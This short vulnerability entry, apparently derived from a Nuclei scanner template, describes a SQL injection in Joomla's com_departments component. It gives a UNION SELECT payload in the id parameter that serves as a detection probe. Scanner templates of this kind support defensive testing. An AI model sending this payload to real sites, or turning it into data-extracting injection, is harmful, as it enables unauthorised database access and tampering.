# Vulnerability: Joomla `departments` - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`joomla-department-sqli.yaml`)

## Description
Joomla! `com_departments` parameter contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/index.php?option=com_departments&id=-1%20UNION%20SELECT%201,md5({{num}}),3,4,5,6,7,8--
```

